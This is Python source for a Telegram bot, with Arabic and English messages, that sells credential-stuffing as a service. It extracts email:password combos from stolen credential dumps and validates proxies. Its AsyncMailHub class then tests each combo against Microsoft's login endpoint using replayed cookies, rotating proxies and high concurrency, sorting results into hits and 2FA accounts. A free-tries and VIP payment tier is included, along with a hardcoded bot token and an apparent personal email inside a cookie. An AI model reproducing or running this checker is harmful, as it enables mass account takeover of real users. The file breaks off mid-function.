import asyncio
import os
import re
import time
import sqlite3
import aiohttp
import random
import threading
from datetime import datetime, timedelta
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from flask import Flask

# ============================================================
# FLASK HEALTH-CHECK / KEEP-ALIVE SERVER (Background Thread)
# ============================================================
flask_app = Flask(__name__)

@flask_app.route("/health")
def health_check():
    return {
        "status": "healthy",
        "service": "combo-bot",
        "timestamp": datetime.now().isoformat(),
        "version": "2.0.0"
    }, 200

def run_flask_server():
    flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)

# ============================================================
# BOT CONFIGURATION
# ============================================================
API_TOKEN = "8814848831:AAEo3Ui19kB30X93-Cuzugzoi4rdfvpwCjw"
bot = AsyncTeleBot(API_TOKEN)
ADMIN_ID = 8703458182
ADMIN_USERNAME = "lxhds"
CHANNEL_USERNAME = "@lsueusuds"
CHANNEL_URL = "https://t.me/lsueusuds"

EMOJI = {
    "yes": '<tg-emoji emoji-id="6023660820544623088">✨</tg-emoji>',
    "fire": '<tg-emoji emoji-id="5999340396432333728">🔥</tg-emoji>',
    "no": '<tg-emoji emoji-id="6037570896766438989">💀</tg-emoji>',
    "lightning": '<tg-emoji emoji-id="6026367225466720832">⚡</tg-emoji>',
    "card": '<tg-emoji emoji-id="5971944878815317190">💫</tg-emoji>',
    "circle": '<tg-emoji emoji-id="5971837723676249096">🌀</tg-emoji>',
    "target": '<tg-emoji emoji-id="5974235702701853774">🎯</tg-emoji>',
    "bot": '<tg-emoji emoji-id="6057466460886799210">😼</tg-emoji>',
    "admin": '<tg-emoji emoji-id="4949560993840629085">🧠</tg-emoji>',
    "box": '<tg-emoji emoji-id="6066395745139824604">🎀</tg-emoji>',
    "rocket": '<tg-emoji emoji-id="6282977077427702833">🎉</tg-emoji>',
    "warning": '<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji>',
    "diamond": '<tg-emoji emoji-id="6023660820544623088">💎</tg-emoji>'
}

LANGS = {
    "ar": {
        "sub_required": f"{EMOJI['warning']} يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!\n\n📌 القناة:",
        "sub_button": "📢 اشترك في القناة الآن",
        "check_sub": "تحقق من الاشتراك",
        "welcome": f"{EMOJI['bot']} <b>أهلاً بك في بوت استخراج الكومبو النقي!</b>\n\n{EMOJI['rocket']} <b>للبدء، قم ببساطة بإرسال (رابط الملف المباشر) هنا:</b>",
        "vip_active": f"متبقي على اشتراكك: ",
        "vip_buy": "اشتراك VIP (شحن بريميوم)",
        "lang_btn": "Language: English",
        "admin_panel_btn": "لوحة تحكم الأدمن (Admin Panel)",
        "link_info_title": f"{EMOJI['target']} <b>تم فحص الرابط بنجاح:</b>\n\n{EMOJI['box']} <b>اسم الملف:</b> `{{filename}}`\n{EMOJI['card']} <b>الحجم الحقيقي:</b> `{{filesize}}`\n\n<b>اختر العملية المطلوبة:</b>",
        "combo_btn": "استخراج كومبو نقي من ملفات ULP (Email:Pass)",
        "cancel_btn": "إلغاء",
        "free_exhausted": f"{EMOJI['warning']} لقد استهلكت محاولاتك المجانية (3 محاولات) لهذا اليوم!",
        "upgrade_vip": "ترقية حسابك إلى VIP للحصول على استخدام غير محدود",
        "sub_not_yet": "لم تقم بالاشتراك بعد!",
        "sub_success": "تم التحقق بنجاح!",
        "lang_changed": "تم تغيير اللغة بنجاح إلى العربية",
        "error_download": "فشل التحميل أو الرابط غير صالح، كود الاستجابة: ",
        "invalid_link": f"{EMOJI['no']} الرابط لا يحتوي على ملف صالح أو أن السيرفر لا يستجيب بشكل صحيح.",
        "processing_panel": f"{EMOJI['circle']} <b>جاري تفريق البيانات واستخراج الكومبو (ULP)...</b>\n⏳ <b>يرجى الانتظار.</b>",
        "download_started_2": f"{EMOJI['rocket']} <b>لوحة التصفية الذكية:</b>\n\n",
        "cancel_process": "إيقاف التحميل (Stop)",
        "process_cancelled": f"{EMOJI['no']} تم إلغاء العملية بناءً على طلبك.",
        "password_prompt": f"{EMOJI['card']} <b>الملف محمي بكلمة سر!</b>\n\n<b>يرجى إرسال كلمة المرور (Password) في الرسالة القادمة، أو اضغط إلغاء:</b>",
        "no_results": f"{EMOJI['no']} لم يتم العثور على بيانات مطابقة للصيغة المطلوبة.",
        "success_results": f"{EMOJI['yes']} تمت العملية بنجاح! تم استخراج {{count}} نتيجة في غضون {{elapsed:.2f}} ثانية.{{remaining}}",
        "remaining_tries": " (متبقي لديك {free} محاولات مجانية اليوم)",
        "unlimited_vip": f" (حساب VIP غير محدود {EMOJI['diamond']})",
        "error_processing": f"{EMOJI['no']} حدث خطأ أثناء المعالجة: ",
        "upload_proxies_btn": "📤 رفع بروكسيات",
        "upload_combos_btn": "📤 رفع كومبو",
        "start_checking_btn": "▶️ بدء الفحص",
        "send_proxy_file": f"{EMOJI['circle']} <b>أرسل ملف البروكسي (.txt) الآن.</b>\n\nالصيغ المدعومة: ip:port أو protocol://ip:port",
        "send_combo_file": f"{EMOJI['circle']} <b>أرسل ملف الكومبو (.txt) الآن.</b>\n\nالصيغة: email:pass",
        "proxy_validation": "{EMOJI['circle']} <b>جاري التحقق من {{count}} بروكسي...</b>",
        "proxies_saved": "{EMOJI['yes']} <b>تم حفظ {{count}} بروكسي صالح.</b>",
        "combos_loaded": "{EMOJI['yes']} <b>تم تحميل {{count}} كومبو صالح.</b>",
        "checking_started": "{EMOJI['rocket']} <b>بدء الفحص...</b>",
        "checking_complete": "{EMOJI['yes']} <b>اكتمل الفحص!</b>",
        "stop_checking": "⏹ إيقاف الفحص",
        "file_too_large": "الملف كبير جداً. الحد الأقصى 10 ميجا.",
        "checking_already_running": "فحص آخر قيد التشغيل بالفعل. انتظر أو ألغِه أولاً.",
        "auto_detect_proxy": "{EMOJI['circle']} <b>تم اكتشاف ملف بروكسي تلقائياً. جاري التحقق...</b>",
        "auto_detect_combo": "{EMOJI['circle']} <b>تم اكتشاف ملف كومبو تلقائياً.</b>"
    },
    "en": {
        "sub_required": f"{EMOJI['warning']} You must subscribe to the bot channel first to use it!\n\n📌 Channel:",
        "sub_button": "📢 Subscribe to Channel",
        "check_sub": "Check Subscription",
        "welcome": f"{EMOJI['bot']} <b>Welcome to the Clean Combo Bot!</b>\n\n{EMOJI['rocket']} <b>To start, send a direct file link here:</b>",
        "vip_active": "VIP Time Left: ",
        "vip_buy": "VIP Subscription (Get Premium)",
        "lang_btn": "اللغة: العربية",
        "admin_panel_btn": "Admin Panel",
        "link_info_title": f"{EMOJI['target']} <b>Link Inspected Successfully:</b>\n\n{EMOJI['box']} <b>File Name:</b> `{{filename}}`\n{EMOJI['card']} <b>Real Size:</b> `{{filesize}}`\n\n<b>Choose operation:</b>",
        "combo_btn": "Extract Clean Combo from ULP (Email:Pass)",
        "cancel_btn": "Cancel",
        "free_exhausted": f"{EMOJI['warning']} You have exhausted your daily free trials!",
        "upgrade_vip": "Upgrade to VIP for unlimited usage",
        "sub_not_yet": "You haven't subscribed yet!",
        "sub_success": "Verified successfully!",
        "lang_changed": "Language changed successfully to English",
        "error_download": "Download failed or invalid link, status code: ",
        "invalid_link": f"{EMOJI['no']} The link does not contain a valid file or the server is unresponsive.",
        "processing_panel": f"{EMOJI['circle']} <b>Processing and filtering combo data precisely...</b>\n⏳ <b>Please wait.</b>",
        "download_started_2": f"{EMOJI['rocket']} <b>Smart Filtering Dashboard:</b>\n\n",
        "cancel_process": "Stop Download",
        "process_cancelled": f"{EMOJI['no']} Process cancelled by user.",
        "password_prompt": f"{EMOJI['card']} <b>The file is password protected!</b>\n\n<b>Please send the password in the next message, or cancel:</b>",
        "no_results": f"{EMOJI['no']} No matching data found.",
        "success_results": f"{EMOJI['yes']} Operation successful! Extracted {{count}} lines in {{elapsed:.2f}}s.{{remaining}}",
        "remaining_tries": " ({free} free tries remaining today)",
        "unlimited_vip": f" (Unlimited VIP Account {EMOJI['diamond']})",
        "error_processing": f"{EMOJI['no']} An error occurred: ",
        "upload_proxies_btn": "📤 Upload Proxies",
        "upload_combos_btn": "📤 Upload Combos",
        "start_checking_btn": "▶️ Start Checking",
        "send_proxy_file": f"{EMOJI['circle']} <b>Send your proxy (.txt) file now.</b>\n\nSupported formats: ip:port or protocol://ip:port",
        "send_combo_file": f"{EMOJI['circle']} <b>Send your combo (.txt) file now.</b>\n\nFormat: email:pass",
        "proxy_validation": "{EMOJI['circle']} <b>Validating {{count}} proxies...</b>",
        "proxies_saved": "{EMOJI['yes']} <b>{{count}} valid proxies saved.</b>",
        "combos_loaded": "{EMOJI['yes']} <b>{{count}} valid combos loaded.</b>",
        "checking_started": "{EMOJI['rocket']} <b>Starting check...</b>",
        "checking_complete": "{EMOJI['yes']} <b>Checking Complete!</b>",
        "stop_checking": "⏹ Stop Checking",
        "file_too_large": "File too large. Max 10MB.",
        "checking_already_running": "Another check is already running. Wait or cancel it first.",
        "auto_detect_proxy": "{EMOJI['circle']} <b>Auto-detected proxy file. Validating...</b>",
        "auto_detect_combo": "{EMOJI['circle']} <b>Auto-detected combo file.</b>"
    }
}

user_states = {}
admin_states = {}
active_downloads = {}

# ============================================================
# DATA DIRECTORIES
# ============================================================
DATA_DIR = "bot_data"
for d in [DATA_DIR]:
    os.makedirs(d, exist_ok=True)

def user_dir(chat_id):
    d = os.path.join(DATA_DIR, str(chat_id))
    os.makedirs(d, exist_ok=True)
    return d

def user_file(chat_id, filename):
    return os.path.join(user_dir(chat_id), filename)

# ============================================================
# DATABASE (Original)
# ============================================================
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            lang TEXT DEFAULT NULL,
            is_vip INTEGER DEFAULT 0,
            vip_expiry TEXT,
            banned INTEGER DEFAULT 0,
            free_uses INTEGER DEFAULT 3,
            last_reset TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user_by_id_or_username(identifier):
    identifier = str(identifier).strip().replace("@", "").lower()
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    if identifier.isdigit():
        cursor.execute("SELECT chat_id FROM users WHERE chat_id = ?", (int(identifier),))
    else:
        cursor.execute("SELECT chat_id FROM users WHERE LOWER(username) = ?", (identifier,))
    row = cursor.fetchone()
    conn.close()
    if row: return row[0]
    return int(identifier) if identifier.isdigit() else None

def get_user(chat_id, username=None):
    chat_id = int(chat_id)
    today_str = str(datetime.now().date())
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT chat_id, username, lang, is_vip, vip_expiry, banned, free_uses, last_reset FROM users WHERE chat_id = ?", (chat_id,))
    row = cursor.fetchone()

    if not row:
        cursor.execute("""
            INSERT INTO users (chat_id, username, lang, is_vip, vip_expiry, banned, free_uses, last_reset)
            VALUES (?, ?, NULL, 0, NULL, 0, 3, ?)
        """, (chat_id, username, today_str))
        conn.commit()
        cursor.execute("SELECT chat_id, username, lang, is_vip, vip_expiry, banned, free_uses, last_reset FROM users WHERE chat_id = ?", (chat_id,))
        row = cursor.fetchone()

    db_chat_id, db_username, db_lang, db_is_vip, db_vip_expiry, db_banned, db_free_uses, db_last_reset = row

    if username and username != db_username:
        cursor.execute("UPDATE users SET username = ? WHERE chat_id = ?", (username, chat_id))
        conn.commit()
        db_username = username

    if db_last_reset != today_str:
        cursor.execute("UPDATE users SET free_uses = 3, last_reset = ? WHERE chat_id = ?", (today_str, chat_id))
        conn.commit()
        db_free_uses = 3

    is_vip_bool = bool(db_is_vip)
    vip_expiry_dt = datetime.fromisoformat(db_vip_expiry) if db_vip_expiry else None

    if is_vip_bool and vip_expiry_dt and datetime.now() > vip_expiry_dt:
        cursor.execute("UPDATE users SET is_vip = 0, vip_expiry = NULL WHERE chat_id = ?", (chat_id,))
        conn.commit()
        is_vip_bool = False
        vip_expiry_dt = None

    conn.close()
    return {
        "chat_id": db_chat_id, "username": db_username, "lang": db_lang,
        "is_vip": is_vip_bool, "vip_expiry": vip_expiry_dt, "banned": bool(db_banned), "free_uses": db_free_uses
    }

def update_user_field(chat_id, field, value):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET {field} = ? WHERE chat_id = ?", (value, chat_id))
    conn.commit()
    conn.close()

async def check_subscription(user_id):
    try:
        member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Error checking sub: {e}")
    return False

def get_remaining_time_str(expiry_date, lang='ar'):
    if not expiry_date: 
        return "مدى الحياة (Lifetime)" if lang == 'ar' else "Lifetime"
    now = datetime.now()
    if expiry_date <= now: 
        return "منتهي" if lang == 'ar' else "Expired"
    diff = expiry_date - now
    total_seconds = int(diff.total_seconds())
    days, hours, minutes = total_seconds // 86400, (total_seconds % 86400) // 3600, (total_seconds % 3600) // 60
    parts = []
    if lang == 'ar':
        if days > 0: parts.append(f"{days} يوم")
        if hours > 0 or days > 0: parts.append(f"{hours} ساعة")
        parts.append(f"{minutes} دقيقة")
        return " و ".join(parts)
    else:
        if days > 0: parts.append(f"{days}d")
        if hours > 0 or days > 0: parts.append(f"{hours}h")
        parts.append(f"{minutes}m")
        return " ".join(parts)

# ============================================================
# ASYNC MAILHUB — Phase 2 Checker Converted to Pure Async
# ============================================================
class AsyncMailHub:
    def __init__(self):
        self.headersMICROSOFT = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        }
        self.failMICROSOFT = ["Your account or password is incorrect.", "That Microsoft account doesn\\'t exist. Enter a different account", "Sign in to your Microsoft account", 'Please sign in with a Microsoft account or create a new account']
        self.retryMICROSOFT = [",AC:null,urlFedConvertRename", "Too Many Requests"]
        self.nfaMICROSOFT = ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "Help us protect your account"]
        self.customMICROSOFT = ["/cancel?mkt=", "/Abuse?mkt="]
        self.hitsMICROSOFT = ['sSigninName', 'PPAuth', 'WLSSC', 'name="ANON"']

    def found(self, keywords, resp):
        for keyword in keywords:
            if keyword in resp:
                return True
        return False

    def payloadMICROSOFT(self, email, password):
        return {
            "i13": "0", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "3", "lrt": "", "lrtPartition": "", "hisRegion": "",
            "hisScaleUnit": "", "passwd": password, "ps": "2",
            "psRNGCDefaultType": "1", "psRNGCEntropy": "",
            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
            "canary": "", "ctx": "", "hpgrequestid": "",
            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
            "PPSX": "Passp", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
            "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
            "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i19": "21648"
        }

    async def loginMICROSOFT(self, email, password, proxy=None, session=None):
        url = "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"
        payload = self.payloadMICROSOFT(email, password)
        close_session = False
        if session is None:
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            timeout = aiohttp.ClientTimeout(total=30)
            session = aiohttp.ClientSession(connector=connector, timeout=timeout)
            close_session = True
        try:
            if proxy:
                async with session.post(url, headers=self.headersMICROSOFT, data=payload, proxy=proxy, ssl=False) as r:
                    text = await r.text()
            else:
                async with session.post(url, headers=self.headersMICROSOFT, data=payload, ssl=False) as r:
                    text = await r.text()

            if self.found(self.hitsMICROSOFT, text):
                return ["ok", None]
            if self.found(self.nfaMICROSOFT, text):
                return ["nfa"]
            if self.found(self.customMICROSOFT, text):
                return ["custom"]
            if self.found(self.failMICROSOFT, text):
                return ["fail"]
            if self.found(self.retryMICROSOFT, text):
                return ["retry"]
            return ["ok", None]
        except Exception:
            return ["retry"]
        finally:
            if close_session:
                await session.close()

# ============================================================
# ASYNC PROXY ENGINE — Ultra-Fast Validation
# ============================================================
async def validate_single_proxy(proxy_raw, proxy_type='http', timeout=8):
    proxy = proxy_raw.strip()
    if not proxy:
        return None
    if '://' not in proxy:
        proxy_url = f"{proxy_type}://{proxy}"
    else:
        proxy_url = proxy

    test_urls = ["http://httpbin.org/ip", "http://ipinfo.io/ip"]
    connector = aiohttp.TCPConnector(ssl=False, limit_per_host=0)
    timeout_cfg = aiohttp.ClientTimeout(total=timeout)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
            for test_url in test_urls:
                try:
                    async with session.get(test_url, proxy=proxy_url, ssl=False) as resp:
                        if resp.status == 200:
                            return proxy
                except Exception:
                    continue
    except Exception:
        pass
    return None

async def validate_proxies(proxy_list, proxy_type='http', max_concurrent=300):
    semaphore = asyncio.Semaphore(max_concurrent)

    async def check_one(proxy):
        async with semaphore:
            return await validate_single_proxy(proxy, proxy_type)

    tasks = [check_one(p) for p in proxy_list if p.strip()]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    valid = []
    for r in results:
        if isinstance(r, str) and r:
            valid.append(r)
    return valid

# ============================================================
# COMBO VALIDATION (from Phase 2)
# ============================================================
def is_valid_combo(line):
    line = line.strip()
    if not line:
        return False
    spam_indicators = [
        'telegram', 't.me', 'discord', 'http://', 'https://',
        '___By@', 'C--l--o--u--d', '!!!', 'H--O--T--M--A--I--L',
        '(ow)z', 'BACK_UP', '##', '@@', '__', '--'
    ]
    line_lower = line.lower()
    if any(indicator.lower() in line_lower for indicator in spam_indicators):
        return False
    if line.count(':') != 1:
        return False
    parts = line.split(':', 1)
    if len(parts) != 2:
        return False
    email, password = parts
    email = email.strip()
    password = password.strip()
    if '@' not in email or len(email) < 3:
        return False
    if not password or len(password) < 1:
        return False
    valid_email_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-+')
    if not all(c in valid_email_chars for c in email):
        return False
    return True

# ============================================================
# PROGRESS BAR HELPER
# ============================================================
def make_progress_bar(percentage):
    percentage = max(0.0, min(100.0, percentage))
    filled_blocks = int(percentage // 10)
    empty_blocks = 10 - filled_blocks
    bar = "█" * filled_blocks + "▒" * empty_blocks
    return f"[{bar}] {percentage:.1f}%"

# ============================================================
# ASYNC COMBO CHECKER ENGINE
# ============================================================
async def run_combo_checker(chat_id, bot_ref, msg_id):
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    combo_path = user_file(chat_id, "combos.txt")
    proxy_path = user_file(chat_id, "proxies.txt")

    if not os.path.exists(combo_path):
        await bot_ref.send_message(chat_id, "No combos loaded. Upload a combo file first.", parse_mode='HTML')
        return

    with open(combo_path, 'r', encoding='utf-8') as f:
        combos = [l.strip() for l in f if is_valid_combo(l)]

    if not combos:
        await bot_ref.send_message(chat_id, "No valid combos found in file.", parse_mode='HTML')
        return

    proxies = []
    if os.path.exists(proxy_path):
        with open(proxy_path, 'r', encoding='utf-8') as f:
            proxies = [l.strip() for l in f if l.strip()]

    if not user["is_vip"]:
        if user["free_uses"] <= 0:
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton(t['upgrade_vip'], callback_data="buy_vip"))
            await bot_ref.send_message(chat_id, t['free_exhausted'], reply_markup=markup, parse_mode='HTML')
            return
        update_user_field(chat_id, "free_uses", user["free_uses"] - 1)
        user = get_user(chat_id)

    if active_downloads.get(chat_id, False):
        await bot_ref.send_message(chat_id, t['checking_already_running'], parse_mode='HTML')
        return

    active_downloads[chat_id] = True

    progress_markup = InlineKeyboardMarkup()
    progress_markup.add(InlineKeyboardButton(t['stop_checking'], callback_data="cancel_checking"))

    status_text = t['checking_started'].format(count=len(combos)) + f"\n{EMOJI['card']} Combos: {len(combos)} | {EMOJI['lightning']} Proxies: {len(proxies)}"
    try:
        status_msg = await bot_ref.edit_message_text(status_text, chat_id, msg_id, parse_mode='HTML', reply_markup=progress_markup)
    except Exception:
        status_msg = await bot_ref.send_message(chat_id, status_text, parse_mode='HTML', reply_markup=progress_markup)

    stats = {'checked': 0, 'valid': 0, '2fa': 0, 'invalid': 0}
    hits = []
    twofa_list = []
    start_time = time.time()
    update_state = {'last_update': time.time()}

    # Cleanup old results
    for fname in ["hits.txt", "2fa.txt"]:
        p = user_file(chat_id, fname)
        if os.path.exists(p):
            os.remove(p)

    connector = aiohttp.TCPConnector(ssl=False, limit=0, enable_cleanup_closed=True, force_close=True)
    timeout = aiohttp.ClientTimeout(total=60)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        semaphore = asyncio.Semaphore(150)

        async def process_one(combo):
            if not active_downloads.get(chat_id, True):
                return
            async with semaphore:
                email, password = combo.split(':', 1)
                proxy = None
                if proxies:
                    p = random.choice(proxies)
                    proxy = f"http://{p}" if '://' not in p else p

                checker = AsyncMailHub()
                result = await checker.loginMICROSOFT(email, password, proxy=proxy, session=session)

                stats['checked'] += 1
                if result[0] == "ok":
                    stats['valid'] += 1
                    hits.append(combo)
                elif result[0] == "nfa":
                    stats['2fa'] += 1
                    twofa_list.append(combo)
                else:
                    stats['invalid'] += 1

                now = time.time()
                if now - update_state['last_update'] > 2.5 and active_downloads.get(chat_id, True):
                    update_state['last_update'] = now
                    elapsed = now - start_time
                    cpm = (stats['checked'] / elapsed) * 60 if elapsed > 0 else 0
                    progress = (stats['checked'] / len(combos)) * 100
                    bar = make_progress_bar(progress)

                    text = (
                        f"{EMOJI['rocket']} <b>Checking in progress...</b>\n\n"
                        f"{EMOJI['box']} <b>Progress:</b> {bar}\n"
                        f"{EMOJI['card']} <b>Checked:</b> {stats['checked']}/{len(combos)}\n"
                        f"{EMOJI['yes']} <b>Valid:</b> {stats['valid']}\n"
                        f"{EMOJI['warning']} <b>2FA:</b> {stats['2fa']}\n"
                        f"{EMOJI['no']} <b>Invalid:</b> {stats['invalid']}\n"
                        f"{EMOJI['lightning']} <b>CPM:</b> {cpm:.0f}\n"
                        f"⏱ <b>Elapsed:</b> {elapsed:.1f}s"
                    )
                    try:
                        await bot_ref.edit_message_text(text, chat_id, status_msg.message_id, parse_mode='HTML', reply_markup=progress_markup)
                    except Exception:
                        pass

        tasks = [process_one(c) for c in combos]
        await asyncio.gather(*tasks, return_exceptions=True)

    active_downloads[chat_id] = False
    elapsed = time.time() - start_time

    hits_path = user_file(chat_id, "hits.txt")
    twofa_path = user_file(chat_id, "2fa.txt")

    if hits:
        with open(hits_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(hits))
    if twofa_list:
        with open(twofa_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(twofa_list))

